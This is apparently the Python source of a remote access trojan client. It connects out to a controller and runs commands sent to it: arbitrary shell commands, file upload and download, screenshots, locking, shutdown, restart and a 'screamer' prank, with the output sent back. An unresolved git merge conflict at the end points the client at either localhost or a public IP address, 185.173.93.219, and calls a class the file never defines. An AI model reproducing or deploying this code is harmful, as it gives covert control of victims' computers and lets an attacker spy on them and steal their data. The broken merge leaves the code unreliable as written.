import socket
import subprocess
import time
import json
import os
import base64
import ctypes
import sys
import pyautogui
import PIL
import commands


class Client:

    # Отправляем json данные серверу
    def send_json(self, data):
        """отправка данных серверу"""
        # Если данные окажутся строкой
        try:
            json_data = json.dumps(data.decode('utf-8'))
        except:
            json_data = json.dumps(data) 
        self.connection.send(json_data.encode('utf-8'))



    # Получаем json данные от сервера
    def receive_json(self):
        """получение данных от сервера"""
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                pass

    def __init__(self, ip, port):
        # Try to connect to the server, if failed wait five seconds and try again.
        while True:
            try:
                self.connection = socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM)
                print("try")
                self.connection.connect((ip, port))
            except socket.error:
                time.sleep(5)
            else:
                break

    def arrayToString(self, s):
        """переводит массив в строку"""
        convStr = ""
        for i in s:
            convStr += i
        return convStr

    # Запускает любую конанду в консоле
    def runCommand(self, command):
        """запускает команду в консоле"""
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    # Reading files with base 64 encryption for non UTF-8 compatability
    def readFile(self, path):
        """читает файл с кодированием"""
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    # Writing files, decode the b64 from the above function
    def writeFile(self, path, content):
        """Записывает файл с кодирование"""
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload complete"
    
    # Обработать изображение с экрана
    def screen_handler(self):
        """делает скриншот"""
        pyautogui.screenshot('1.png')
        with open('1.png', 'rb') as file:
            reader = base64.b64encode(file.read())
        os.remove('1.png')
        return reader

    def run(self):
        while True:
            command = self.receive_json()
            try:
                match command[0]:
                    case "exit":
                        self.connection.close()
                        sys.exit()
                    case "ratHelp":
                        command_response = ""
                    case "cd":
                        if len(command) > 1:
                            os.chdir(command[1])
                        convCommand = self.arrayToString(command)
                        command_response = self.runCommand(convCommand).decode()
                    case "upload":
                        command_response = self.writeFile(command[1], command[2])
                    case "download":
                        command_response = self.readFile(command[1]).decode()
                    case "message":
                        command_response = commands.message(command[:1])
                    case "lock":
                        command_response = commands.lock_pc()
                    case "shutdown":
                        command_response = commands.shutdown_pc()
                    case "restart":
                        command_response = commands.restart_pc()
                    case "screenshot":
                        command_response = self.screen_handler()
                    case "screamer":
                        command_response = commands.screamer()
                    case "syscom":
                        command_response = commands.sys_command(command[1:])
                    case _:
                        convCommand = self.arrayToString(command)
                        command_response = self.runCommand(convCommand).decode()
            # Whole error handling, bad practice but required to keep connection
            except Exception as e:
                command_response = (
                    f"[-] Error running command: {e}"
                )
            self.send_json(command_response)


print("run")
<<<<<<< HEAD
ratClient = Client("127.0.0.1", 8080)
=======
ratClient = RATConnector("185.173.93.219", 9090)
>>>>>>> main
ratClient.run()
